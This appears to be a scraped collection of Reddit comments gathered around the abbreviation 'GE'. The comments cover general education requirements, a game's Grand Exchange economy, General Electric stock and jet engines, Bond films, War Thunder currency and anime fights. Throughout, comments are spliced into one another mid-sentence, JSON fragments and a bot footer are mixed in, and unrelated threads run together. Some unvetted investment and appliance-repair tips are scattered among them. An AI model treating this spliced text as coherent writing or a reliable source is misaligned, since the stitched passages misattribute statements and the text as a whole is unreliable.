UB offers courses more catered to the arts such as psychology or communications. Course fees are more manageable for UOL and RMIT too with the latter being pricier. Depends on what you want, but main reason why UOL and RMIT are popular is because 1) business courses 2) more reputable in a sense 3) course fees. Thats just a personal take.\n\n1.2 UOL is 100% exam, so your one final exam makes up 100% of your grade. Cant advice for the rest since im not from UOL. RMIT is usually 50% assignment and 50% exam. Assignment usually consists of grp and individual assignments, varies for every module. The 50% exam is usually a timed 2h 15min paper with 15min reading time.

However, science majors have more course requirements than north campus, so that's something to consider when planning schedules.", "In that case I\u2019d do 13S, Math 21 since it\u2019s Cooperstein, and a GE", "I asked the same thing in the thread that was cross-posted to /r/SmartThings.

In fact, I think the current system encourages that even more than the one I propose.\n\nIf people are forced to do GEs and yet GEs cannot be used to fulfill subject (let's use this as a general term for degree/major/minor) requirements, then there's no incentive to take harder GEs. Most would just opt to take an easy GE that is useful to them, and the only useful effect is pulling up their CAP so yea.\n\nOn the other hand, if there were no GEs and they were just UEs, they have the additional effect where they can be used for subject requirements. This means there's some incentive to take harder mods, not just mods that help to pull up their CAP, because it can help meet subject requirements, which usually require harder higher-level modules.\n\nAlso, there's the 60 MC limit on level 1 modules as well as vacancy limits for all mods including those easier mods which helps to reduce the number of people taking those easier mods (which tend to be level 1) to get a higher CAP.\n\nAnother alternative is to just do what UK unis and I think some other European unis do which is to just remove GEs and UEs and allow their students to get a bachelor's degree in 3 years, master's degree in 4 years. This would get rid of this CAP manipulation problem and allow us to graduate earlier which is especially good for guys, because they already graduate later due to NS. The downside is that people cannot take second subjects.", "I mean I guess that makes some sense. Interdisciplinary stuff would definitely actually create modules that actually force subjects (let's use this as a general term for degree/major/minor) to be integrated together. Is it really helpful or necessary though? I wrote a longer post why I don't think this is the case but I didn't want to come across as angry or ranty or weird so here's a shorter version lol:\n\nBy forcing these interdisciplinary curriculum, students would have to sacrifice on depth of knowledge. The fact that students can take more than one subject should be sufficient for breadth. Using up mods for GEs (especially ones focused on interdisciplinary thinking which will likely do not focus on depth) means less depth, it would be better to minimise them.\n\nAlso, taking two subjects that are complementary don't really need interdisciplinary-thinking-focused mods to make it explicit how to integrate them together. If they are already complementary, it's unnecessary.\n\nOn the other hand, taking two subjects that pretty much don't mix at all should not be forced to be integrated for the sake of interdisciplinary thinking. If they are just not meant to be integrated, there is no need to force it.\n\nEven if all my points are wrong and interdisciplinary stuff is better no matter what, is it really necessary to force it on all students? Why not merely leave it as an option?", "Why Mech Eng? The IDP is sufficient for students who like design. It should be an option, not something forced on the main curriculum. As a Mech Eng student, I feel like our curriculum is already inferior compared to those from other unis. They've reduced the number of core Mech Eng modules to make space for UEs, GEs, and even the engineering core modules (of which not all are relevant to Mech Eng) in the latest curriculum change. I feel like we already learn less than students from other unis and as a result, we are less capable engineers. If they force this further curriculum change, we'll have even less space for Mech Eng core modules and we'll further learn a lot less. This change would be bad for Mech Eng IMO, and probably even for all engineering disciplines.", "I don't know the technical specifics of why, but cheap microwaves suck.

Today she brought up the topic of gender equality and was going on and on about how unfair it was that even at this day and age women were still treated as the \"lesser\" gender and that everybody should respect and practice gender equality. She then asked each of us if we agreed with her.\n\nThe other 3 coworkers just went \"yea I guess\" while i shrugged. She turned to me and asked me if I disagreed with her.\n\nI told her that I didn't really believe in gender equality as males and females are biologically different by nature (stated it as a fact) and there will naturally be different expectations of people in certain aspects. And that sometimes those different expectations can manifest in discrimination, which I wholeheartedly disagree with. That does not change the fact that we ARE biologically different and \"gender equality\" just...doesn't work if taken to the logical extreme.\n\nShe got super offended and started accusing me of being a sexist (technically accurate), misogynistic (for the record, I never expressed any opinions on the topic before this) AH. \n\nI pointed out that in our culture, it was standard practice to give 3 months of paid maternity leaves to mothers who just gave birth, while dads only got a week of paid paternity leave. If we were to apply GE in such a scenario, we would expect the mom to be back at work after just a week of post childbirth. She went off on how the mother had to carry the baby for 9 months and would need to breastfeed the kid for some time. I told her I totally agreed with her, and that was a perfect example of why GE doesn't work: males and females are BIOLOGICALLY different and we couldn't just \"treat everyone equally all the time\".\n\nShe continued to accuse me of sexist thinking and it was people like me that caused women to be discriminated against. At this point, I had had enough of her insults and asked her \"doesn't your BF pay for your portion whenever you guys go on dates? And didn't you once say that you judge potential dates on whether they offer to pay for you on the first date?\"\n\nShe said that was different and that its common practice / gentlemanly behavior for a guy to offer to pay for the girl on a date. I said \"I don't disagree (I actually don't, I pay for the girl on dates all the time), but that goes against the very idea of GE. You can start trumpeting on about GE again once you actually split your bills and pay him back your portion for all previous dates, otherwise you're nothing but a hypocrite who only wants equality when it benefits you.\"\n\nShe refused to speak to me for the rest of the day, so I wonder, AITA for what I said?\n\n*I am a bot, and this action was performed automatically.

It's a good problem to have but the massive surge of players in such a short period has sort of had a negative impact the value of gold.

Current state is that you usually instabuy/sell at +-5%. If you introduce tax, the instasell/buy thresholds would dramatically increase, based on how much is the item traded (and thus flipped).\n\nMy point exactly, however it's usually 1-3% on items that are traded often, as I mentioned earlier skilling supplies/pvm items. So a small added tax will barely be noticeable, items fluctuate more than a few % every day/week, having an 0.5% tax on the PvM gear items should barely have effect on their pricing. \n\nAlso you can't negate player trading and I don't see it as a negative, it's also not something that has too much to do with supply/demand on ge, it's almost always because of the ge limits. Bulk skilling supplies etc. are purchased in bulk because there's limits to how much you can buy from ge like chronotes.

If you have, they should have explained what paths are or are not available to you and what steps you can take.\n\nIf you haven't already contacted your professors, it's probably a bit too late to retroactively fix things now. Many professors are understanding that emergencies happen and are willing to make accommodations for missing an important exam. At the same time, many would have a hard time understanding why there was no communication for six+ weeks after missing a final exam.\n\nGoing forward, you'll likely need to retake the class you failed to get the GE credit. I believe (I could be wrong) that the D+ will still count as credit towards completing the GE requirement. You can still retake the D+ if you want to fix the hit to your GPA.\n\nI know it can be difficult reaching out and explaining a tough situation to people, especially professors, in the middle of an emergency. Even though it's hard, it's important to communicate. Professors won't know if you're someone who decided to silently drop a class or if you need some kind of help or accommodations. Some professors can be hard-hearted, but I would say most of us do want to support our students.", "What had GE done recently that makes you think they will double in the coming 7 months?

Also - what is your general investment strategy? Ie are you going for tech/growth stocks or Covid turnaround/value stocks?\nAt the moment you seem to have a bit of a pick \u2018n mix. It\u2019s obviously fine to have a split (I\u2019m around 75% value/recovery and 25% tech) but as long as you have an overall investment strategy rather than just picking names.\n\nAlso personally I am a big believer in the Covid turnaround play - but for that you have to look at valuations. As others have said, a lot of cruise liners (inc CCL) are back to their pre Covid levels - and cruises aren\u2019t even happening right now. So any surge in business post Covid is already incorporated into the stock price.\n\nEqually, AMC I would ditch - adjusted for their stock issuances, it is trading at higher than its pre Covid level. Also even before Covid the business was struggling. There are much better Covid recovery/value plays out there.\nI\u2019d look for companies still 25-30% below their pre Covid level, which have a solid turnaround/Covid recovery strategy.\n\nGE i think could potentially be good, will be a long term recovery though but could be well worth it (for a similar/leaner industrial powerhouse, consider RYCEY as they are well below pre Covid level and are similarly a big jet engine/defence manufacturer).\n\nSPCE - can you justify your rationale for holding it? If you can\u2019t I\u2019d dump it. They\u2019ve done nothing in the last 10yrs in terms of launches/tech, have no revenue and will likely need to raise more cash soon.

Your view may be right - the market is incorrectly pricing the stock currently and the price may jump up soon - but do consider that you may have less info or less analytical skills than you think. \n\nBut if bullish... There are many strategies to employ. Given my lack of confidence in GE and a desire to keep the capital used down, I\u2019d consider a bull call spread.

You could immediately see what each actor was going for in their debuts. With Brosnan, he felt lost and came off as a caricature of Bond: he delivered the wit, charm, and humor that Connery set as an expectation for the character, but did nothing to develop his interpretation past that. I also think that Brosnan looked too young in GE. His hairstyle was similar to the one he had from Remington Steele to attract female audiences. This boyish Bond didn't fit with the jaded veteran the film tried to present. \n\nBrosnan got better in TND, though that film didn't give him much material to show his acting chops. His hairstyle is much better and he looks more mature for the role. \n\nBrosnan's best performance was in TWINE. He got his best material since GE, but unlike GE where he was the weak link in a film with well-executed elements, Brosnan was the one who gave it his all while a lot of the rest of the film languished in mediocre execution. To highlight this, he is threatening in the Bilbao scene, but also gets to be cool with some witty dialogue (\"hidden assets\"). \n\nI think Brosnan's second best performance was in DAD, solely because the early segments gave him some original material to work with. Brosnan may have been a bit heavier, but he still had charisma and tried his best in an otherwise very silly film. \n\nI think Brosnan was in a similar situation to Joel Schumaucher. Both were brought into the franchise to course-correct after more divisive installments that have since been re-appraised (Licence To Kill and Batman Returns). However, the stories they truly wanted to tell were that from before and the films they appeared in tried to add more depth (Bond falling in love with the villain and being tortured in North Korea; Bruce Wayne struggling with his identity and Alfred suffering from a disease) but suffered from being too silly. After their films, we had darker reboots that in a way returned to the style that the divisive films had (LTK to CR is less of a shakeup than DAD to CR, Batman Begins has a unique Gotham City atmosphere closer to the Burton films than the Schumaucher films).", "Yeah it's daft an everyone was outraged on the dovbleg for she's just another event Pr.26 &amp; it makes sense a premium 5.7 for 2500GE would make the Premium Pr.68 obsolete than which is practically obsolete due to GE price.\n\n\nI stillbelieve we should of probably gotten the Pr.1134A without the missiles as that would of made a fine 5.3 vessel lol..", "&gt;Voroshilov (USSR): \nTier IV\n5.7\nhidden event vehicle\ncrew: 100.000 SL\nexpert crew: 360.000 SL\nace crew: 620.000 RP / 1400 GE\nstock repair cost: 3780 / 3770 SL\ntalisman: 1900 GE\n9x 180 mm/57 B-1-P + 6x 100 mm/56 B-34 obr. 1940g. + 6x 45 mm 21-K + 13x 37 mm 70-K + 4x 12.7 mm DShK obr. 1938g. + 8x 12.7 mm Vickers Mk.

It would be good to see shop runs such as those made somewhat automatic (with an extra GP cost) rather than dailyscape, such as via an Invention golem or an update to Construction where you can give your butler a shopping list. The stock could also do with updating a little; some of the items in there are noticeably less useful than others. \n\nRipper Demons are a pain to make; one way to alleviate this and make them more of a coin sink would be to reduce the arch materials needed from 2 of each to 1 of each (and maybe allow noted) but increase the spirit shard cost (e.g. to 500 or even 1000 shards per demon).

Not \"we did some papers on the concept\".\n\nWhich is exactly what I'm talking about. You can continue following these reports back every ten years into the 1960s. Between then and the 1980s, about a dozen different small reactor concepts were **actually built**. That's far more \"serious\" than any of the modern projects so far. For instance:\n\nIn the US:\n\nElk River was designed to be \"Rural America\u2019s First Atomic Power Plant\" with the goal of being able to be deployed in small markets where the larger plants from GE and Westinghouse could not be used. To make it small, it used a shrunken core running on MEU and thorium fuel. Started operation in 1964, stopped in 1968 when cracks were found.\n\nLa Crosse was a pure small BWR completed in 1968 that ran for 18 years and can be considered technically successful. It was, however, much more expensive than planned and one of the operators concluded: \"The only problem was it was too small\".\n\nAnd then there was Fort St. Vrain, a gas-cooled prismatic solid design which avoided high construction costs by requiring only a single small prestressed concrete shell to be constructed on-site, all the rest of the parts shipped in completed form, and lacking the need for a large containment structure. Also fueled with U and Th, and had a high thermal efficiency which it was claimed would make it super-economical. Suffered many problems in use and was shut down after 10 years.\n\nIn the UK:\n\nAEE Winfrith was an entire site dedicated to testing civilian reactor designs. DIMPLE was moved there as a model for a small size reactor (\\~300MW) running on either heavy water or organic coolant. JUNO and Dragon followed, both sub-scale prototypes for small reactor designs intended to be used across the UK (JUNO) or Europe (Dragon). It also hosted SGHWR, which was small (100MW) but intended as a subscale prototype for a larger commercial design of \\~600MW, so it doesn't count. Other small reactor designs in the UK from that era include HRT and PFR, but neither were designed to be modular so don't count either.\n\nOthers:\n\nCanada: WR-1 was a small organically cooled reactor that was built in Manitoba in 1965. It was intended to be commercialized at two scales, a large one about 600MW as a competitor to the CANDU, and a much smaller design \\~150MW that would be installed in two major parts (reactor and power-pack). Turns out OCRs are a terrible idea and development was shut down in 1973 in favour of the baseline CANDU.\n\nCANDU then developed in several directions, notably CANDU6, which would not be considered a SMR by today's definitions, but was at the time. It was specifically designed to be built in units that could be paired for future growth, so if you examine a picture of a CANDU6 plant you'll notice there's almost always two reactors on a common conventional plant, with the idea being that you could start with one reactor and then install another at any time. Additionally, the design lacked a large pressure vessel, so it could be locally built in nations lacking large forging, which included Canada when it was designed. There's a great image of the Indian site being lifted into position using logs.\n\nGermany: AVR was the prototype for THTR-300, which is an SMR by any definition, new or old. It has a 300MW nameplate capacity, the reactor is built entirely in a factory and shipped complete to site, mated to the conventional plant and then fueled using its online fuel system. Both plants were unmitigated disasters that will not be completed cleaned up until the next century.\n\nI'm sure there's more I'm forgetting.\n\n&gt;Then you haven't read the actual papers.\n\nI have read lots of them. None of them discusses the problem I raised, that the costs of the conventional plant are well known and represent a larger proportion of the costs than these plants suggest exist as savings. In order for the math to work their reactors will have to cost negative dollars.\n\nBy all means, if you have a paper that you think explains this apparent quandary, forward it to me."], "2021-05-10": ["https://github.com/GloriousEggroll/proton-ge-custom/releases/tag/6.8-GE-1\n\nI'm on mobile, can't use proper quote formatting, sorry:\n\n IMPORTANT NOTES\n\nDue to large changes in wine 6.5+, you will need to remove old/current prefixes for any games launched with this version.

The other engine, the XA101, is being developed by Pratt &amp; Whitney.\n\nIn addition to proving out the adaptive concept at full scale, both demonstrators are designed as a 45,000-lb.-thrust-class engine to meet potential growth requirements for the conventional-takeoff-and-landing variants of the Lockheed Martin F-35. For now, however, the focus is on evaluating the performance and operability of a morphing propulsion system that offers a step change in combat capability through the dynamic modulation of a third stream of air.\n\nFor both engine-makers, the full-scale tests mark the culmination of the AETP. The program was launched in 2016 to develop three-stream demonstrators for full-scale development from earlier research efforts. These included the Air Force Research Laboratory\u2019s Adaptive Engine Technology Development (AETD) and Adaptive Versatile Engine Technology (Advent) programs, which helped prove the basics of practical variable-cycle propulsion.\n\nResults from test runs of the first XA100 have exceeded expectations, says David Tweedie, GE Edison Works\u2019 general manager for Advanced Combat Engines. Testing at GE\u2019s high-altitude test cell in Evendale, Ohio, began on Dec. 22 and continued through late March. \u201cWe hit all of our primary test objectives,\u201d Tweedie tells Aviation Week. \u201cThe engine behaved right along with our pretest predictions and was very consistent with the program goals. We were able to demonstrate the two different modes of the engine and the ability to seamlessly transition between those two modes.\u201d\n\nDesigned to run separately to the conventional core air and lower-pressure bypass flows, the additional third stream can be redirected to provide increased thrust during combat or better fuel efficiency during cruise conditions. The AETP goals aimed to improve thrust and fuel efficiency by 10% and 25%, respectively, compared with a 2015 state-of-the-art fighter engine. \u201cNot only are we meeting that, we\u2019re actually exceeding that pretty much everywhere in the flight envelope\u2014and in a few places up to 20% [more thrust],\u201d Tweedie says. \u201cWe are very happy with where we are from thrust in terms of over-delivering versus the program requirement.\n\n\u201cWhen you translate that to what it means to the platform, it\u2019s 30% more range or 50% more loiter time, depending on how you want to utilize that fuel-burn improvement,\u201d he says. \u201cIt\u2019s a significant increase in acceleration and combat capability with the increased thrust.\u201d\n\nAnother crucial parameter for the test program is the effectiveness of using heat exchangers in the third stream for thermal management\u2014a growing challenge particularly for low-observable, advanced combat aircraft with high-energy level sensors, systems and weapons. \u201cWe see a significant increase in capability there [with] up to two times mission systems growth enabled by the [improved] thermal management,\u201d Tweedie says.\n\nAs well as overall performance, testing also focused on the operability of the power management system and its ability to automatically transition between modes. The system manages this feature as a function of the power setting on the engine. \u201cAs you get to a point where throttle demand would indicate you want to be in the higher thrust mode, that\u2019s when the engine kicks over,\u201d says Tweedie. \u201cThe vision here is the pilot won\u2019t even know what mode they\u2019re in. It should be completely transparent to them, and it\u2019s simply scheduled into the engine.\u201d\n\nGE\u2019s altitude test site, which was built in the 1960s to support development of the GE4 for the U.S. civil supersonic program, has been used to clear the initial XA100 performance characteristics. \u201cWe\u2019ve been able, within the limits of our facility, to work at multiple points of the flight envelope to get data,\u201d Tweedie says. \u201cThis has not been just sea-level static testing of this engine, which is why we have the confidence we have.\u201d \n\nAssembly of the second XA100 prototype is \u201cwell underway,\u201d GE says. This will be tested at the Air Force\u2019s Arnold Engineering Development Complex (AEDC) in Tullahoma, Tennessee. \u201cAEDC has the capabilities that we don\u2019t have on site, which is why the second engine is scheduled to go there and finish out building the matrix to the points we weren\u2019t able to hit,\u201d Tweedie adds.\n\nChanges to the second engine will be limited to instrumentation, software and controls. However, the engine hardware\u2014which includes parts made from high-temperature-resistant ceramic matrix composites (including rotating components in the low-pressure turbine) and polymer matrix composites\u2014will be identical to the first engine.\n\nMeanwhile, Pratt &amp; Whitney has reaffirmed a program goal to take the first of two XA101 adaptive engines developed under the AETP program to testing within the next seven months. \u201cThe program goal is still to get the first engine to test by the end of the year,\u201d a Pratt &amp; Whitney spokesman says. \n\nThe XA100 and XA101 represent the most advanced options on a spectrum of upgrades for the F-35 propulsion system that have been under study by the Joint Program Office since last year. The F-35 Propulsion Road Map for 2035 is expected to inform funding decisions for a long-term upgrade plan that should begin in fiscal 2023. Besides reengining with an adaptive turbofan, the propulsion road map is considering Pratt &amp; Whitney\u2019s proposed Engine Enhancement Packages, a rebranding of the formerly titled Growth Option 1 and 2 offerings for the F-35\u2019s existing F135 propulsion system.\n\n\u201cNone of those new engine improvements at the time came anywhere close to the level of transformation that we\u2019re offering here,\u201d GE\u2019s Tweedie says, citing the effect of reengining on previous generations of combat aircraft. \u201cThe Air Force has preserved this optionality throughout the eight years of the AETD and AETP programs, and the F-35 is going to be a mainstay of their fleet for decades to come.\n\n\u201cThis [XA100] engine is proving that it works,\u201d he continues. \u201cSo we\u2019re hopeful that there\u2019s an opportunity here to bring this capability to help modernize the platform at the right time.\u201d\n\nThe AETP also provides a convenient risk-reduction option for a major spin-off to support the Next-Generation Adaptive Propulsion (NGAP) program. The Air Force awarded two $427 million contracts to GE and Pratt to develop a new core optimized for the Next-Generation Air Dominance program. Unlike the 45,000-lb.-thrust requirement for the single-engine F-35, the NGAP is more likely to be sized to support a twin-engine application for a next-generation fighter to replace the Lockheed F-22, with the thrust rating of each engine significantly lower than that of the F-22.\n\n\u201cI don\u2019t believe, certainly in GE\u2019s history and probably in Air Force history, that there\u2019s been this much investment and this much rigor to product requirements at this prototyping phase,\u201d Tweedie says. \u201cIt\u2019s really so we don\u2019t have a big redo loop as part of it. So we\u2019re pretty confident that we could turn this around pretty quickly and head into a low-risk engineering, manufacturing and development program.\u201d", "I bought one of the stream packs for 2\u20ac.

Perhaps if I had other GE devices (like a hub) they might use it (?).  So let me explain what I am seeing:\n\nSo, to clarify - what I have is a C by GE Smart Plug.  It is a small rectangle with a single plug.  LED light to the right of plug and a round reset button on the side.  Looks like this:\n\n[https://images.idgesg.net/images/article/2020/09/c-by-ge-smart-plug-primary-100859277-large.jpg](https://images.idgesg.net/images/article/2020/09/c-by-ge-smart-plug-primary-100859277-large.jpg)\n\nI have been using this with Google Mini, and initially did the setup via the Google Home app.  Under this configuration it appears that the device will never obtain an IP address and must be communicating with the Google Mini devices strictly through their local BT network (some proof on this below).\n\nHowever, you can also set this device up using the C by GE app on your phone.  This requires you create a C by GE account and then link the device to it.  Once you have done this you can also choose to link your C by GE account to Google Home and control them this way instead of directly installing it under Home as a device.  \n\nIf you choose to setup using the C by GE app, the device appears to perform a DHCP request for an IP address.  I configured my laptop to do a packet capture in promiscuous mode on the WiFi network and filtered only communication to the MAC address of the plug.  The \\*only\\* time I see any traffic from the MAC address is when it is negotiating the IP (or I ping the device).  Outside of that I never see any traffic to the device.  This is true whether I turn the device off and on using Google Home with the device linked direct, or whether I use the C by GE app either directly or linked to Google Home.  So, while it does get an IP address, it is seemingly not used at all in my configurations.\n\nWhat is also interesting to note on these devices is that if you use the C by GE app to setup the device you can configure automation routines for the plug.  For example, you can set a time for the plug to go off and on again.  In order to use the app to configure the device it requests that BT is enabled and states you need to be in range.  Once I configured a schedule to toggle the light I put my phone in Airplane mode and waited.\n\nThe switch toggled off at the right time and I did not notice any traffic on the network to its MAC address.  What this means is that the automation schedule is actually stored within the switch itself.  It clearly has enough power to keep track of the time and to enact the schedule which must have been uploaded over my phones BT connection to its local configuration.\n\nBecause I was using only the C by GE app, and did not have it configured via Google at this point, and since no traffic was seen on the network at any point when I enabled or executed the schedule, this is the only feasible explanation.\n\n*Unfortunately, while the device now has an IP address, it does not expose any UI for me to access it direct.  For anyone who cares, the reason I was looking to do all this in the first place was that I was planning to hook a couple of smart switches up to my PCs so that I could toggle their power when I was away for extended periods of time in case of power outage and if my UPS wasn't properly behaving as it should.  Because I also occasionally have some lockups on my router I was considering adding one here as well.  However I quickly realized that if I used my app remotely to turn \\*off\\* my router, there would be no way for me to toggle it back \\*on\\* since my internet connection would then be down.  Therefore,  I was hoping that maybe a UI exposed a \"cycle\" option where it would turn off and on again in turn.*", "Thanks for the reply, This is the top of the AC unit just above the filter.

Most GE units have cases that are screwed not welded together. If you can, take off the outer case of the AC.

This will allow you to better see the mold. If it doesn\u2019t so easily shake out or wipe off you can try dish soap and some hot water and some friction ( don\u2019t get water on anything electrical but fins and copper pipes is fine). If that isn\u2019t working well you can take some sandpaper and try to remove the mold by just sanding away some of the foam.

I've seen comments about how people haven't been able to get into OHMSS because of its pace and think that the film is silly for most of its runtime.

In comparison, I get downvoted when I respectfully state my opinion on things like how Brosnan's performance or the action were underwhelming in GE.\n\nI respect your opinion and there are definitely people who unfairly nitpick GF and GE, but I think GE, and GF to a lesser extent, get lots of love with their flaws being overlooked.

Looks like it\u2019s in stock at HD, in fact it is on sal for a couple hundred less than I paid.", "So let's see. Goku is incredibly durable, extremely fast and extremely strong. (He even punched trough time). Every Attack from Goku would be an overkill. But not against GER. Removing the effect and leaving behind the cause is a daim strong ability. So what does this mean? \nWell, Diavolo could skip time, meaning his stand is a 5 dimensional beeing (beeing outside time itself (\"sing a song of sorrow in a world where time has vanished\"). But GER was able removing even that. Meaning GER is a 6 dimensional beeing (at least). That implies that Goku can't do anything against him. He can't kill him. It would only remove the effect of \"beeing killed\". So does this mean this fight is a draw? Goku can't kill Giorno and Giorno can't kill Goku? Well not exactly. Even though GER can't harm Goku trough physical strength, he can harm him in  an other way. GER still has the ability of creating life. These lifeforms have the power of damage reflection. If you kill for example the frog, you will get the damage (If you think you could use the scene where Diavolo kills a scorpions as an argument, then sadly I have to disappoint you. That was an error from David Productions. In the manga, Diavolo didn't kill them. Maybe DP forgot about the damage reflection, leaving to create this error). So, what do you think will happen if Goku and Giorno fight a eternal fight? At some point, Goku will kill one of the animals from Giorno, and at that moment Goku dies. But it's even worse! Remember what happened to Diavolo? He got killed by a Junkie and got trapped in an infinit death loop. So what does this mean? Well, it means that, even though Diavolo didn't got Killed from GER, he still experienced the effect. So that means in this fight. Goku would never reach the truth and will be stuck in an infinit death loop. So even with the Dragon balls, they couldn't revive them. Because! To revive someone, they need not be dead. But Goku is not dead. He's in a death loop. Infinit scenarios where Goku dies, get revived to another scenario to die again. So technically speaking, they can't revive him. If the rest of his friends know about the death loop, they can get him out of there. But if they don't know about it. \nSo you see. Goku can't do anything against Giorno. Except with help. From Xeno for example. Together they would stomp him", "Either way it's way beyond GER", "&gt;Seriously? GER is stated to have every ability GE had and enhanced\n\nAnd has GER ever been shown to use such an ability?\n\n&gt;so he would be able to see an ant between his fist and giorno?\n\nAgain, when was **GER** ever done such a thing?\n\n&gt;did you just explain why you were wrong? yeah exactly, of course he's not always fighting as hard, and training is the same.

Also I'm pretty sure when your attacks don't affect your opponent, you try to hit him... harder?\n\nHow did i self explain my statement as being wrong?\n\n\nDoes Goku hit regular humans with the same force as when he's facing off against Jiren? Goku Black? Zamasu?\n\n\nNo\n\n\nThe force that he hits himself with during his training is far beyond what he would use against Giorno\n\n&gt;but GER was stated to have GE abilities\n\nAnd yet has never shown to use said abilities. Your point is?\n\n&gt;this, GER stats are none because the other stands can't be compared of it because they are on another level, or to put it another way, every single one of his stats is above every other stands, even though we litterally have infinite speed\n\nAh yes. The classic stand stats page\n\n\nNothing suggests that GER is even lightspeed much less infinite speed\n\nThe very nature of Requiem stands themselves are unknown. Hence why GER's stand page has unlisted stats\n\n\nStand pages themselves aren't valid proof as they're contradictory to what is being shown\n\n&gt;I don't need to argue on this one so why would I go on? I have better things to do with my time you know\n\nAnd yet here you are\n\n&gt;again, sure. Altho the fight might as well last until goku dies of old age (except heroes)\n\nWhich is untrue\n\n\nGER has shown that it's hax defense reverses time to before the attack even started.

Is there proof of this, or is it merely a matter of subjectivity?\n\nFull disclosure, I'm a bit of a string theory partisan though not a serious expert. I wouldn't say it's accurate to claim that LQG unites quantum mechanics with general relativity, or at least that it has not been proven yet. There are still issues showing that LQG reproduces general relativity in the appropriate limit. \n\nString theory has that going for it at the very least. You impose special relativity and quantum mechanics on a string and you get a massless spin-2 particle in the spectrum of the string, which has to behave like gravity. This massless spin-2 = gravity thing was well-known for field theoretic reasons before string theory. So string theory is at least *a* theory of quantum gravity, if not *the* theory of quantum gravity.\n\nI think there have been claims by Rovelli and others that the classical limit of GR is recovered, but without the time/background to really evaluate this myself, my impression is that most people who aren't LQG theorists aren't really convinced yet. I might be misremembering this, however. It's been a while since I did much reading on it.\n\n\n&gt; And also, by extension, to what degree have both theories (string theory and LQG) been proven?\n\nNeither has been proven in any serious scientific sense. Neither one has produced testable predictions accessible to current technology which could distinguish the theory from current theories of physics. You often hear that gravity a \"prediction\" of string theory because of what I outlined above, and it's a rather elegant theoretical result, but it doesn't distinguish a string theory reality from the reality of our current theories of physics.", "I must have been sleeping at the wheel but I hadn't seen or heard anything about the reverse split till now.\n\nI am selling my remaining positions in GE.

I have taken classes the second time they were offered and have seen (as far as the instructor is to be believed, but there is no reason to lie about it) times when a teacher tells us about a change, or how a lab didn't work to well so they are redoing it this semester etc...  I think once you get farther long in the life of a class, stuff gets set pretty much in stone unless it is purposefully wanted to be changed/redone/etc...  Plus I think most of the time when students think have feedback, its often on things that they didn't like, but are still objectively good, but just require effort. \r  \n\r  \n**Do you feel like those changes are positive?**\n\nSee above.  Early on in a classes lifecycle, yes.  Later on, my experience with TA'ing (I've never TA'd a new class) shows that people either have very little feedback on a class that is meaningful, or they think they have feedback, but its just a result of students wanting things to be easier so they don't have to do as much work.  Those are often the same students who didn't do very well in the class/material to begin with.\r  \n\r  \n**What do you think of the GE program and how many years/months have you been at BYU?**\n\nI enjoyed basically all of my GEs even ones that were very far away from my (engineering) major, like humanities classes.  I feel like there are some classes that are less worth taking than others, and some teachers to avoid, but all the tools to know what you are getting into are there.  I spent 5 years in my undergrad (with a misison after the first year) and am currently in a graduate program, but that last time I took a GE was probably the 16-17 school year.\r  \n\r  \n**How do you pick your classes?**\n\nEarly on in my undergrad it was like this:  I need to take these 1-2 classes for my major this semester to stay on track and get pre-reqs done.  They have literally 1 teacher at 1 class time so no choices to be made, just pick which lab section I want.  After that I would fill in GEs that fit my schedule AND had good teachers from rate my professor or some I trusted.  Good teacher was prioritized over good schedule (obviously as long as it didn't conflict with a required class that I couldn't move).\n\nMy Junior and Senior year it was basically: Only classes in my major, only one option for each class in terms of time and teacher so I either didn't get to pick, or if I had an option, like \"take 2 out of A, B, C, and D\" I would take the ones with the best teachers that friends were also taking.\n\n\r\r  \n**What is your overall impression of the education you're receiving at BYU?**\n\nIts good.  I definitely got more out of some non-class elements like undergrad research than I did out of a lot of classes, but most of my classes, but major and GE were really solid.", "&gt;would remove 2x more money from the game?\n\nIt would stop being a gold sink if the money is put back into the game to pay players who sell an item on the GE", "just make it when you buy an item in the GE you have 50% chance the banker yoinks it from you and runs off with the item and the cash.\n\n\nEconomy problem suddenly solved", "They are for example saying \"Buying item A for 150 million\", you read it, knowing item A costs 100 mill on the GE.

Yes, you know 120 is too much for item A, but hey, you still make 30 mill in the end.\n\nWell, the issue is, that they are actually the ones selling item A and never actually trade you for the 150 mill. You just spend 20mil too much on a item worth 100,trying to make a sale.", "Being game smart doesn't always keep you from being greedy.\n\nThe most common one right now is buying high value items for well over GE price, saying they need you to trade their \"main\" in camelot/falador/wherever, and putting up tele tabs for you to use...

Those eventually wear out from the rubbing of the drum, the drum then starts rubbing (and wearing down) the plastic drum bearing.\n\nIt eventually starts squeaking like crazy.
